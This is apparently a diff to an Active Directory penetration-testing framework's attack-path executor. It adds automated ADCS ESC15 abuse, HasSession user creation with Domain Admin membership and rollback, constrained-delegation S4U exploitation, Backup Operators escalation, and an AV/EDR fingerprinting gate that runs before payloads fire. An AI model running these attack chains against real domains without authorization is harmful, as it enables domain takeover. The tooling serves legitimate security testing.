+                    from adscan_internal.cli.adcs_exploitation import (
+                        _resolve_template_min_key_size,
+                    )
+
+                    esc_cfg = EscConfig(
+                        esc=15,
+                        domain=domain,
+                        auth_domain=domain,
+                        dc_ip=str(domain_data.get("pdc") or ""),
+                        auth_kdc=str(domain_data.get("pdc") or ""),
+                        ca_host=str(
+                            domain_data.get("adcs")
+                            or domain_data.get("pdc_hostname")
+                            or domain_data.get("pdc")
+                            or ""
+                        ),
+                        ca_name=str(domain_data.get("ca") or ""),
+                        template=template,
+                        username=exec_username,
+                        password=password,
+                        target_upn=esc15_target_upn,
+                        workspace_dir=_resolve_workspace_dir(shell, domain),
+                        shell=shell,
+                        ca_fqdn=_resolve_ca_fqdn(domain_data),
+                        dc_fqdn=(
+                            domain_data.get("dc_fqdn")
+                            or domain_data.get("pdc_hostname")
+                            or None
+                        ),
+                        min_key_size=_resolve_template_min_key_size(shell, domain, template or ""),
+                    )
+                    esc15_result = run_esc_sync(esc_cfg)
+                    if not esc15_result.success:
+                        _handle_failed_adcs_step(
+                            "ADCSESC15",
+                            from_label,
+                            to_label,
+                            notes={
+                                "username": exec_username,
+                                "template_used_for_run": template,
+                            },
+                        )
+                        return execution_started
+                    _handle_successful_adcs_step(
+                        "ADCSESC15",
+                        from_label,
+                        to_label,
+                        notes={
+                            "username": exec_username,
+                            "template_used_for_run": template,
+                        },
+                    )
                 continue
 
             if key == "goldencert":
@@ -6923,6 +9894,7 @@ def execute_selected_attack_path(
                         domain=domain,
                         target_host=target_host,
                         workflow_label="HasSession exploitation",
+                        service="smb",
                         resume_after_pivot=True,
                     )
                     is None
@@ -7109,6 +10081,23 @@ def execute_selected_attack_path(
                 ):
                     return execution_started
 
+                # AV/EDR pre-check gate — fingerprint the target host once
+                # and surface Defender/EDR state before the schtask payload
+                # ever fires. Operator decides whether to proceed (informed,
+                # not blocked).
+                gate_decision = _hassession_av_edr_gate(
+                    shell,
+                    domain=domain,
+                    target_host=target_host,
+                    target_user=target_user,
+                    session_user=session_user,
+                    exec_username=exec_username,
+                    exec_password=password,
+                    non_interactive=non_interactive,
+                )
+                if gate_decision == "abort":
+                    return execution_started
+
                 execution_started = True
                 with _active_step_context(
                     action=action,
@@ -7123,6 +10112,11 @@ def execute_selected_attack_path(
                         "exec_context_source": exec_context_source,
                     },
                 ):
+                    # Track what we actually created so the finally rollback
+                    # knows exactly what to clean up.
+                    _hs_user_created_by_us: bool = False
+                    _hs_user_added_to_da: bool = False
+
                     try:
                         update_edge_status_by_labels(
                             shell,
@@ -7158,7 +10152,24 @@ def execute_selected_attack_path(
                             command_to_run=create_command,
                             log_suffix="create_user",
                         )
-                        if not create_ok:
+                        if create_ok:
+                            _hs_user_created_by_us = True
+                            # Write crash-recovery checkpoint immediately after
+                            # creating the account so even a mid-step crash
+                            # leaves a recoverable record.
+                            _write_hassession_cleanup_checkpoint(
+                                shell,
+                                domain=domain,
+                                target_user=target_user,
+                                target_password=target_password,
+                                target_host=target_host,
+                                session_user=session_user,
+                                exec_username=exec_username,
+                                exec_password=password,
+                                user_created_by_us=True,
+                                group_candidates=group_candidates,
+                            )
+                        else:
                             lowered = create_output.lower()
                             already_exists = any(
                                 marker in lowered
@@ -7199,6 +10210,7 @@ def execute_selected_attack_path(
                             )
                             if not add_ok:
                                 continue
+                            _hs_user_added_to_da = True
                             if not waited_for_membership:
                                 _wait_for_hassession_membership_propagation(
                                     shell,
@@ -7307,6 +10319,26 @@ def execute_selected_attack_path(
                             "HasSession exploitation executed, but Domain Admin "
                             "membership could not be verified."
                         )
+
+                    # Rollback — runs on success AND failure. If nothing was
+                    # created or modified this is a no-op. Crash recovery is
+                    # handled separately via the checkpoint file; this covers
+                    # the normal execution path (happy and sad).
+                    if _hs_user_created_by_us or _hs_user_added_to_da:
+                        _run_hassession_rollback(
+                            shell,
+                            domain=domain,
+                            exec_username=exec_username,
+                            exec_password=password,
+                            target_host=target_host,
+                            session_user=session_user,
+                            target_user=target_user,
+                            target_password=target_password,
+                            user_created_by_us=_hs_user_created_by_us,
+                            group_candidates=group_candidates,
+                            non_interactive=non_interactive,
+                        )
+                        _clear_hassession_cleanup_checkpoint(shell, domain=domain)
                 continue
 
             if key == "allowedtodelegate":
@@ -7342,19 +10374,6 @@ def execute_selected_attack_path(
                     )
                     return execution_started
 
-                if not hasattr(shell, "enum_delegations_user"):
-                    print_warning(
-                        "Cannot execute this step: delegation executor is unavailable."
-                    )
-                    _mark_blocked_step(
-                        action,
-                        from_label,
-                        to_label,
-                        kind="unavailable",
-                        reason="Delegation executor unavailable",
-                    )
-                    return execution_started
-
                 execution_started = True
 
                 with _active_step_context(
@@ -7376,7 +10395,40 @@ def execute_selected_attack_path(
                     except Exception as exc:  # noqa: BLE001
                         telemetry.capture_exception(exc)
 
-                    shell.enum_delegations_user(domain, exec_username, password)
+                    # The actual SPN being delegated to (e.g.
+                    # "CIFS/winterfell.north.sevenkingdoms.local") is stored
+                    # in the edge notes as `delegated_spn` by the collector.
+                    # `to_label` is the target computer node (e.g.
+                    # "WINTERFELL$@NORTH...") which is informational only —
+                    # `exploit_delegation_constrained` needs the SPN.
+                    # The constrained delegation type (with/without protocol
+                    # transition) is auto-handled by kerbad's S4U2Self+
+                    # S4U2Proxy chain — no client-side branching needed.
+                    delegated_spn = str(details.get("delegated_spn") or "").strip()
+                    if not delegated_spn:
+                        print_warning(
+                            "AllowedToDelegate edge missing 'delegated_spn' in details — "
+                            "cannot dispatch S4U. Re-run the LDAP collector to refresh."
+                        )
+                        _mark_blocked_step(
+                            action,
+                            from_label,
+                            to_label,
+                            kind="unavailable",
+                            reason="Edge missing delegated_spn (stale graph?)",
+                        )
+                        return execution_started
+
+                    from adscan_internal.cli.delegations import (  # noqa: PLC0415
+                        exploit_delegation_constrained,
+                    )
+                    exploit_delegation_constrained(
+                        shell,
+                        domain=domain,
+                        username=exec_username,
+                        password=password,
+                        delegation_to=delegated_spn,
+                    )
                 continue
 
             if key in {"dumplsa", "dumpdpapi"}:
@@ -7493,6 +10545,51 @@ def execute_selected_attack_path(
                         f"{action} did not recover a credential for {marked_user}. Stopping this path."
                     )
                     return True
+                continue
+
+            if key == "backupoperatorescalation":
+                from adscan_internal.cli.backup_operators_escalation import (
+                    offer_backup_operators_escalation,
+                )
+                bo_username = _resolve_execution_user(
+                    shell,
+                    domain=domain,
+                    context_username=context_username,
+                    summary=summary,
+                    from_label=from_label,
+                )
+                bo_password = context_password or _resolve_domain_password(
+                    shell, domain, bo_username
+                )
+                if not bo_username or not bo_password:
+                    print_warning(
+                        f"Cannot execute BackupOperatorEscalation: no credential available for {from_label}."
+                    )
+                    return execution_started
+                _update_attack_path_step_status_at_index(
+                    shell,
+                    domain=domain,
+                    summary=summary,
+                    step_index=idx - 1,
+                    status="attempted",
+                    notes={"user": bo_username},
+                )
+                success = offer_backup_operators_escalation(
+                    shell,
+                    domain=domain,
+                    username=bo_username,
+                    password=bo_password,
+                )
+                if success:
+                    _update_attack_path_step_status_at_index(
+                        shell,
+                        domain=domain,
+                        summary=summary,
+                        step_index=idx - 1,
+                        status="success",
+                        notes={"user": bo_username},
+                    )
+                    execution_started = True
                 continue
 
             # Unknown supported key shouldn't happen due to pre-check, but keep safe.
@@ -7691,13 +10788,22 @@ def _build_attack_path_summary_provider(
     max_depth: int,
     target: str,
     target_mode: str,
+    display_friendly: bool | None = None,
 ) -> Callable[[], list[dict[str, Any]]]:
     """Build a reusable summary provider for a specific attack-path scope."""
     start_norm = (start or "").strip().lower()
 
     def _compute_summaries() -> list[dict[str, Any]]:
         if start_norm == "owned":
-            owned_users = get_owned_domain_usernames_for_attack_paths(shell, domain)
+            from adscan_internal.services.attack_graph_service import (
+                get_attack_path_owned_principal_labels,
+            )
+
+            owned_users = get_attack_path_owned_principal_labels(
+                shell,
+                domain,
+                include_trusted_domains=True,
+            )
             if not owned_users:
                 return []
             return get_attack_path_summaries(
@@ -7708,6 +10814,7 @@ def _build_attack_path_summary_provider(
                 max_paths=None,
                 target=target,
                 target_mode=target_mode,
+                display_friendly=display_friendly,
             )
 
         marked_domain = mark_sensitive(domain, "domain")
@@ -7722,6 +10829,7 @@ def _build_attack_path_summary_provider(
             max_paths=None,
             target=target,
             target_mode=target_mode,
+            display_friendly=display_friendly,
         )
 
     return _compute_summaries
@@ -7736,6 +10844,7 @@ def offer_attack_paths_with_non_high_value_fallback(
     max_display: int = 20,
     target: str = "highvalue",
     target_mode: str = "tier0",
+    display_friendly: bool | None = None,
     context_username: str | None = None,
     context_password: str | None = None,
     allow_execute_all: bool = False,
@@ -7767,6 +10876,7 @@ def offer_attack_paths_with_non_high_value_fallback(
             max_depth=max_depth,
             target=target,
             target_mode=target_mode,
+            display_friendly=display_friendly,
         )
         try:
             direct_summaries = direct_compute()
@@ -7832,6 +10942,7 @@ def offer_attack_paths_with_non_high_value_fallback(
         max_depth=max_depth,
         target="highvalue",
         target_mode=target_mode,
+        display_friendly=display_friendly,
     )
     try:
         primary_summaries = primary_compute()
@@ -7929,6 +11040,7 @@ def offer_attack_paths_with_non_high_value_fallback(
         max_depth=max_depth,
         target="all",
         target_mode=target_mode,
+        display_friendly=display_friendly,
     )
     try:
         fallback_summaries = fallback_compute()
@@ -7992,19 +11104,14 @@ def _offer_sectioned_attack_paths(
     snapshot_target_mode: str = "tier0",
 ) -> bool:
     """Display attack paths grouped Tier-0, then high-value, then pivots."""
-    merged = _sort_target_priority_groups(summaries)
-
-    # Wrap recompute so refreshed results are also re-grouped by priority class.
-    _orig_recompute = recompute_summaries
-
-    def _recompute_sorted() -> list[dict[str, Any]]:
-        fresh = _orig_recompute() if callable(_orig_recompute) else merged
-        return _sort_target_priority_groups(fresh)
-
+    # Canonical ordering is applied inside offer_attack_paths_for_execution_summaries
+    # via order_attack_paths_for_display, which already groups by priority
+    # class (Tier 0 → high-value → pivot) before choke-point ranking, so
+    # no separate regrouping is needed here.
     return offer_attack_paths_for_execution_summaries(
         shell,
         domain,
-        summaries=merged,
+        summaries=summaries,
         show_sections=True,
         max_display=max_display,
         context_username=context_username,
@@ -8013,7 +11120,7 @@ def _offer_sectioned_attack_paths(
         default_execute_all=default_execute_all,
         execute_only_statuses=execute_only_statuses,
         retry_attempted=retry_attempted,
-        recompute_summaries=_recompute_sorted,
+        recompute_summaries=recompute_summaries,
         snapshot_scope=snapshot_scope,
         snapshot_target=snapshot_target,
         snapshot_target_mode=snapshot_target_mode,
@@ -8124,13 +11231,28 @@ def offer_attack_paths_for_execution_summaries(
     snapshot_scope: str = "domain",
     snapshot_target: str = "highvalue",
     snapshot_target_mode: str = "tier0",
-    auto_continue_theoretical_in_non_interactive: bool = False,
+    auto_continue_theoretical_in_non_interactive: bool = True,
 ) -> bool:
     """Shared UX loop for showing/executing already computed path summaries.
 
     When ``show_sections=True`` the table renders Tier-0 first, then
     high-value paths, then pivots. Callers must pass summaries pre-grouped
     in that order.
+
+    Default policy (centralised so CI and interactive callers behave the
+    same way without each having to remember the right kwargs):
+
+    * ``auto_continue_theoretical_in_non_interactive=True`` — in
+      non-interactive contexts, once no ``theoretical`` paths remain the
+      loop converges cleanly rather than re-prompting. This stops the
+      "infinite re-prompt" regression seen in CI runs where post-execution
+      paths transition to ``attempted``/``exploited`` and would otherwise
+      be re-selected because the actionability gate admits ``attempted``.
+    * ``execute_only_statuses=None`` resolves to ``{"theoretical"}`` in
+      non-interactive contexts (set internally below). In interactive
+      contexts ``None`` keeps the broader default (``theoretical`` +
+      ``attempted``) so the operator can retry attempted paths manually
+      if they want — CI never auto-retries.
     """
     if not summaries:
         return False
@@ -8182,17 +11304,40 @@ def offer_attack_paths_for_execution_summaries(
         return Confirm.ask(prompt, default=default)
 
     def _refresh_summaries() -> list[dict[str, Any]]:
-        if recompute_summaries is None:
-            updated = _sorted_paths(list(summaries))
-        else:
-            updated = _sorted_paths(list(recompute_summaries() or []))
-        return _annotate_execution_readiness(
+        # Force-drop every attack-path cache layer before recomputing.
+        # The on-disk graph has just been mutated by the execution we are
+        # refreshing for — relying on the mtime-based invalidation that
+        # ``save_attack_graph`` triggers is correct under normal POSIX
+        # timing but can silently miss on filesystems with coarse mtime
+        # resolution. Centralising the drop here matches the user
+        # expectation: "after an execution, the next list MUST reflect
+        # the change".
+        from adscan_internal.services.attack_graph_service import (
+            force_fresh_attack_paths_recompute,
+        )
+        force_fresh_attack_paths_recompute(
+            domain, reason="post_execution_refresh"
+        )
+
+        # ORDER MATTERS: annotate FIRST so the canonical sort key in
+        # ``order_attack_paths_for_display`` can read
+        # ``meta["execution_target_viability_status"]`` (populated by the
+        # annotator) and demote paths whose terminal host is unreachable
+        # from the current vantage. Sorting before annotation would leave
+        # ``viability_rank=0`` for every record and silently lose the
+        # reachable-target-first ordering inside the same priority bucket.
+        base = (
+            list(summaries) if recompute_summaries is None else list(recompute_summaries() or [])
+        )
+        autocorrect_summary_statuses_from_steps(base, domain=domain)
+        annotated = _annotate_execution_readiness(
             shell,
             domain=domain,
-            summaries=updated,
+            summaries=base,
             context_username=context_username,
             context_password=context_password,
         )
+        return order_attack_paths_for_display(annotated)
 
     def _domain_now_pwned() -> bool:
         domains_data = getattr(shell, "domains_data", None)
@@ -8203,31 +11348,56 @@ def offer_attack_paths_for_execution_summaries(
             return False
         return domain_data.get("auth") == "pwned"
 
-    desired_statuses = (
-        {str(s).strip().lower() for s in execute_only_statuses}
-        if execute_only_statuses
-        else None
-    )
-    desired_statuses_set = (
-        desired_statuses if isinstance(desired_statuses, set) else None
-    )
+    # Status-filter policy:
+    # * Explicit ``execute_only_statuses`` from the caller always wins.
+    # * If the caller passed ``None`` and we are in a non-interactive
+    #   context, narrow the default to ``{"theoretical"}`` so CI never
+    #   auto-retries a path that already transitioned to ``attempted``,
+    #   ``blocked``, or any non-theoretical state. This is the canonical
+    #   safety policy: CI runs the happy path; the operator decides
+    #   manually whether to retry edge cases.
+    # * Interactive callers passing ``None`` keep the broader default so
+    #   the operator can re-execute an attempted path on demand — the
+    #   actionability gate downstream still admits ``theoretical`` and
+    #   ``attempted`` in that case.
+    if execute_only_statuses:
+        desired_statuses_set: set[str] | None = {
+            str(s).strip().lower() for s in execute_only_statuses
+        }
+    elif non_interactive:
+        desired_statuses_set = {"theoretical"}
+        print_info_debug(
+            "[attack_paths] desired_statuses auto-narrowed to "
+            "{'theoretical'} for non-interactive run: "
+            f"domain={marked_domain}"
+        )
+    else:
+        desired_statuses_set = None
 
     # Initial annotation: the summaries passed by the caller are already fresh
     # (just computed). Annotate them in-place without calling recompute_summaries,
     # which would trigger a redundant full recomputation (including any interactive
     # engine selector). The recompute_summaries callback is reserved for subsequent
     # refresh calls after a path has been executed.
-    summaries = _annotate_execution_readiness(
-        shell,
-        domain=domain,
-        summaries=_sorted_paths(list(summaries)),
-        context_username=context_username,
-        context_password=context_password,
+    #
+    # Canonical UX ordering is applied here once. ``order_attack_paths_for_display``
+    # is the single source of truth that both the table renderer and the
+    # selector prompt below consume — they cannot diverge by construction.
+    # Sectioned mode does not need a secondary regroup: the canonical key
+    # already orders by priority class (Tier 0 → high-value → pivot) before
+    # applying choke-point ranking within each class.
+    # ORDER MATTERS: annotate FIRST so the canonical sort key sees the
+    # populated ``meta["execution_target_viability_status"]`` and demotes
+    # unreachable-target paths within their priority bucket.
+    summaries = order_attack_paths_for_display(
+        _annotate_execution_readiness(
+            shell,
+            domain=domain,
+            summaries=summaries,
+            context_username=context_username,
+            context_password=context_password,
+        )
     )
-    # When rendering grouped sections, re-group after sorting so the class
-    # buckets remain stable while preserving relative order within each class.
-    if show_sections:
-        summaries = _sort_target_priority_groups(summaries)
     persist_attack_path_snapshot(
         shell,
         domain,
@@ -8301,11 +11471,90 @@ def offer_attack_paths_for_execution_summaries(
     # batch while still converging to a fixpoint automatically.
     single_pass = non_interactive and not auto_continue_theoretical_in_non_interactive
 
+    # In non-interactive auto-continue mode, paths whose status stays
+    # "theoretical" after a blocked/unsupported/declined cycle would be
+    # re-picked forever (default_idx always lands on the first theoretical
+    # candidate). Track indices that have already been attempted in this
+    # loop so we skip past them. The set is keyed by the position in
+    # ``summaries``; ``_refresh_summaries`` preserves order so it stays
+    # stable across iterations within a single ordering, but gets cleared
+    # on refresh because the ordering may change.
+    _tried_idx_set: set[int] = set()
+
+    # Identity-stable guardrail (DEFENCE IN DEPTH): survives refreshes
+    # AND survives broken step-status updates. The index set above is
+    # reset every refresh; the actionability gate trusts ``status``
+    # which a buggy exec might fail to update. Without this third layer
+    # a single missed status write turns into an infinite re-prompt
+    # loop. Keyed by ``attack_path_session_signature`` which hashes the
+    # logical path (source + target + node sequence), so the same path
+    # gets the same signature even when the summary dict is rebuilt by
+    # the recompute callback.
+    #
+    # Semantics:
+    # * Recorded the moment we DISPATCH execution, not when execution
+    #   completes — that way even a primitive that raises mid-flight or
+    #   leaves status partially written still gets blocked from re-pick.
+    # * Used by the default-selection logic to skip past signatures we
+    #   have already tried in this UX loop, AND by the option renderer
+    #   to surface "just attempted" badges so the operator sees the
+    #   state explicitly instead of having a phantom default mysteriously
+    #   land on a different path.
+    _attempted_signatures: set[Any] = set()
+
+    def _mark_path_attempted(summary: dict[str, Any]) -> None:
+        """Record this path as attempted in the current session.
+
+        Called immediately before dispatching execution so a primitive
+        that crashes mid-execution still gets the signature recorded.
+        Silent no-op when the summary has no derivable signature — see
+        :func:`attack_path_session_signature` for the rationale.
+        """
+        sig = attack_path_session_signature(summary)
+        if sig is not None:
+            _attempted_signatures.add(sig)
+
+    def _path_was_attempted_this_session(summary: dict[str, Any]) -> bool:
+        """Return ``True`` when this path has already been attempted.
+
+        Used by the default-selection logic and the option renderer to
+        avoid re-suggesting a path the operator (or CI) already tried,
+        regardless of what its ``status`` field claims.
+        """
+        sig = attack_path_session_signature(summary)
+        return sig is not None and sig in _attempted_signatures
+
+    def _record_attempt(idx: int) -> None:
+        """Mark a path index as attempted in both tracking layers.
+
+        Wraps the legacy ``_tried_idx_set`` (refresh-scoped, index-based)
+        and the new ``_attempted_signatures`` (session-scoped,
+        identity-based) so every call site that previously did
+        ``_tried_idx_set.add(idx)`` now activates BOTH guardrails with
+        a single helper call. Bounds-checked because some refuse paths
+        re-call this after a refresh shrank the list.
+        """
+        _tried_idx_set.add(idx)
+        if 0 <= idx < len(summaries):
+            _mark_path_attempted(summaries[idx])
+
     while True:
-        options = [
-            f"{idx + 1}. {summary.get('source')} -> {summary.get('target')} [{summary.get('status')}]"
-            for idx, summary in enumerate(summaries[:max_display])
-        ]
+        # Option labels include a "just attempted" suffix for paths whose
+        # logical signature was already recorded in this session — gives
+        # the operator immediate feedback ("yes, this is the same path I
+        # just executed, not a phantom retry"). The suffix is appended
+        # after the canonical ``[status]`` so accessibility tools that
+        # parse the line still see the status as the first bracketed
+        # token.
+        options = []
+        for idx, summary in enumerate(summaries[:max_display]):
+            label = (
+                f"{idx + 1}. {summary.get('source')} -> "
+                f"{summary.get('target')} [{summary.get('status')}]"
+            )
+            if _path_was_attempted_this_session(summary):
+                label = f"{label} · just attempted"
+            options.append(label)
         if allow_execute_all:
             options.append("Execute all remaining attack paths (recommended for CI)")
         options.append("Skip attack path execution")
@@ -8315,7 +11564,13 @@ def offer_attack_paths_for_execution_summaries(
         # Default selection rule:
         # - If batch execution is enabled and explicitly defaulted, prefer the batch option
         #   when there is at least one eligible candidate.
-        # - Otherwise pick the first theoretical path; if none exist, default to Skip.
+        # - Otherwise pick the first theoretical path that has NOT been
+        #   attempted in this session yet. The session-wide signature
+        #   guardrail (``_attempted_signatures``) is the load-bearing
+        #   defence-in-depth that prevents infinite loops when a path's
+        #   step status fails to update after a successful or failed
+        #   execution (the actionability gate would still admit the
+        #   path as theoretical otherwise).
         default_idx = skip_idx
         if allow_execute_all and default_execute_all and execute_all_idx is not None:
             candidates_exist = any(
@@ -8328,6 +11583,7 @@ def offer_attack_paths_for_execution_summaries(
                         str(summary.get("status") or "theoretical").strip().lower(),
                         desired_statuses_set,
                     )
+                    and not _path_was_attempted_this_session(summary)
                 )
                 for summary in summaries
             )
@@ -8339,6 +11595,8 @@ def offer_attack_paths_for_execution_summaries(
                     idx
                     for idx, summary in enumerate(summaries[:max_display])
                     if _is_theoretical_status(summary.get("status"))
+                    and idx not in _tried_idx_set
+                    and not _path_was_attempted_this_session(summary)
                 ),
                 skip_idx,
             )
@@ -8564,12 +11822,6 @@ def offer_attack_paths_for_execution_summaries(
                 str(selected_meta.get("execution_context_action") or "step"),
                 "detail",
             )
-            print_warning(warning_message)
-            print_info_debug(
-                "[attack_paths] execution pre-check blocked: "
-                f"domain={marked_domain} action={marked_action} "
-                f"reason={mark_sensitive(debug_reason, 'detail')}"
-            )
             blocked_target_label = str(
                 selected_meta.get("execution_target_label")
                 or selected.get("target")
@@ -8578,21 +11830,90 @@ def offer_attack_paths_for_execution_summaries(
             blocked_viability_status = str(
                 selected_meta.get("execution_target_viability_status") or ""
             ).strip()
-            if blocked_target_label and blocked_viability_status in {
-                "resolved_but_unreachable",
-                "enabled_but_unresolved",
-                "not_in_enabled_inventory",
-            }:
-                maybe_offer_pivot_opportunity_for_host_viability(
-                    shell,
-                    domain=domain,
-                    blocked_target=blocked_target_label,
-                    viability_status=blocked_viability_status,
-                    operator_summary=None,
+            blocked_matched_ips: list[str] = list(
+                selected_meta.get("execution_target_matched_ips") or []
+            )
+            blocked_action = str(
+                selected_meta.get("execution_context_action") or ""
+            ).strip()
+
+            # --- Stale-snapshot advisory for unreachable hosts ------------------
+            # The vantage report is a snapshot. In real engagements workstations
+            # go offline and come back between scan and execution. Offer a fresh
+            # TCP probe instead of hard-blocking, so operators don't miss a valid
+            # path just because the host was down at scan time.
+            go_hard_block = True
+            if (
+                blocked_viability_status == "resolved_but_unreachable"
+                and blocked_target_label
+                and not is_non_interactive()
+            ):
+                probe_result = _run_stale_snapshot_probe(
+                    target_label=blocked_target_label,
+                    matched_ips=blocked_matched_ips,
+                    action=blocked_action,
                 )
-            if single_pass:
-                return executed
-            continue
+                if probe_result is not None and probe_result.status == "open":
+                    # Host is up — let execution proceed. The pre-flight inside
+                    # _verify_attack_step_native will confirm again before auth.
+                    print_info_debug(
+                        "[attack_paths] stale-snapshot probe overrode blocked gate: "
+                        f"domain={marked_domain} action={marked_action} "
+                        f"probe={probe_result.status} port={probe_result.port}"
+                    )
+                    go_hard_block = False
+                elif probe_result is None:
+                    # User declined the probe — hard block without extra noise
+                    pass
+
+            if go_hard_block:
+                print_warning(warning_message)
+                print_info_debug(
+                    "[attack_paths] execution pre-check blocked: "
+                    f"domain={marked_domain} action={marked_action} "
+                    f"reason={mark_sensitive(debug_reason, 'detail')}"
+                )
+                if blocked_target_label and blocked_viability_status in {
+                    "resolved_but_unreachable",
+                    "enabled_but_unresolved",
+                    "not_in_enabled_inventory",
+                }:
+                    # Inference short-circuit: if every reasonable source
+                    # (direct vantage + every probed pivot) has already
+                    # failed to reach the target, don't run the pivot UX
+                    # again. The first time a target is blocked we DO run
+                    # the pivot probe (so the negative evidence gets
+                    # persisted); on subsequent paths sharing the same
+                    # target, we save the cost.
+                    from adscan_internal.services.target_reachability_inference_service import (
+                        infer_target_reachability,
+                    )
+                    _skip_pivot_offer = False
+                    for _matched_ip in blocked_matched_ips:
+                        _verdict = infer_target_reachability(
+                            shell, domain=domain, target_ip=_matched_ip
+                        )
+                        if _verdict.globally_unreachable:
+                            _skip_pivot_offer = True
+                            print_info_debug(
+                                "[attack_paths] skipping pivot UX — "
+                                f"target globally unreachable: ip={mark_sensitive(_matched_ip, 'ip')} "
+                                f"rationale={mark_sensitive(_verdict.rationale, 'detail')}"
+                            )
+                            break
+                    if not _skip_pivot_offer:
+                        maybe_offer_pivot_opportunity_for_host_viability(
+                            shell,
+                            domain=domain,
+                            blocked_target=blocked_target_label,
+                            viability_status=blocked_viability_status,
+                            operator_summary=None,
+                        )
+                if single_pass:
+                    return executed
+                _record_attempt(selected_idx)
+                continue
+            # else: fall through — execution proceeds with stale-snapshot overridden
         if execution_support_status == "unsupported":
             marked_action = mark_sensitive(
                 str(selected_meta.get("execution_context_action") or "step"),
@@ -8615,6 +11936,7 @@ def offer_attack_paths_for_execution_summaries(
             )
             if single_pass:
                 return executed
+            _record_attempt(selected_idx)
             continue
         execution_ready_count = (
             selected_meta.get("execution_ready_count")
@@ -8664,6 +11986,7 @@ def offer_attack_paths_for_execution_summaries(
             )
             if single_pass:
                 return executed
+            _record_attempt(selected_idx)
             continue
         if computer_viability_status in {
             "resolved_but_unreachable",
@@ -8690,6 +12013,7 @@ def offer_attack_paths_for_execution_summaries(
             )
             if single_pass:
                 return executed
+            _record_attempt(selected_idx)
             continue
         if desired_statuses_set is not None and not _status_allowed_by_filter(
             status, desired_statuses_set
@@ -8703,6 +12027,7 @@ def offer_attack_paths_for_execution_summaries(
             )
             if single_pass:
                 return executed
+            _record_attempt(selected_idx)
             continue
 
         if not _confirm_or_default(
@@ -8714,8 +12039,17 @@ def offer_attack_paths_for_execution_summaries(
             )
             if single_pass:
                 return executed
+            _record_attempt(selected_idx)
             continue
 
+        # Record the attempt BEFORE dispatching execution so that even
+        # if the primitive raises mid-flight (or completes without
+        # updating step status due to a vendor bug), the path can never
+        # be re-selected by default in the same session. Belt-and-
+        # suspenders alongside the post-execution markers added by
+        # the refusal branches above — see ``_record_attempt`` and
+        # ``attack_path_session_signature`` for the full rationale.
+        _record_attempt(selected_idx)
         executed = execute_selected_attack_path(
             shell,
             domain,
@@ -8755,9 +12089,15 @@ def offer_attack_paths_for_execution_summaries(
                 "Refreshing attack-path summaries after execution "
                 "(this can take longer on large domains)."
             )
+            # _refresh_summaries already returns canonical UX order via
+            # order_attack_paths_for_display, so no secondary regroup is
+            # needed even when show_sections=True.
             summaries = _refresh_summaries()
-            if show_sections:
-                summaries = _sort_target_priority_groups(summaries)
+            # Indices in _tried_idx_set were relative to the previous
+            # summaries list. After a refresh the ordering may have changed
+            # (e.g., a step transitioning to ``success`` reranks paths), so
+            # the set is no longer meaningful — start fresh.
+            _tried_idx_set.clear()
             persist_attack_path_snapshot(
                 shell,
                 domain,
@@ -8767,6 +12107,28 @@ def offer_attack_paths_for_execution_summaries(
                 target_mode=snapshot_target_mode,
                 search_mode_label=search_mode_label,
             )
+            # Auto-continue convergence: stop the non-interactive loop
+            # when there is nothing meaningful left to try. "Meaningful"
+            # combines two signals:
+            #
+            # 1. The path is still ``theoretical`` AND admitted by the
+            #    status filter (legacy criterion — handles the happy
+            #    path where execution flips paths to exploited/attempted).
+            # 2. The path has NOT already been attempted in this session
+            #    (new criterion — handles the failure modes the
+            #    ``_attempted_signatures`` guardrail was built for:
+            #    primitives that succeed but fail to update step status,
+            #    primitives that crash mid-flight, recompute callbacks
+            #    that return the same stale view, etc.).
+            #
+            # Without (2), a non-interactive caller that does not pass
+            # ``recompute_summaries`` (or whose recompute is a no-op for
+            # this test) loops forever because the path keeps reading
+            # ``theoretical`` even after the auto-confirmed execution.
+            # Combining both signals means convergence is reached when
+            # either every theoretical path made progress OR every
+            # theoretical path has already had its turn — whichever
+            # happens first.
             if (
                 non_interactive
                 and auto_continue_theoretical_in_non_interactive
@@ -8776,12 +12138,14 @@ def offer_attack_paths_for_execution_summaries(
                         str(summary.get("status") or "theoretical").strip().lower(),
                         desired_statuses_set,
                     )
+                    and not _path_was_attempted_this_session(summary)
                     for summary in summaries
                 )
             ):
                 print_info_debug(
                     "[attack_paths] auto-continue converged: "
-                    f"domain={marked_domain} no theoretical summaries remain"
+                    f"domain={marked_domain} no untried theoretical "
+                    "summaries remain"
                 )
                 return True
             actionable_paths = [
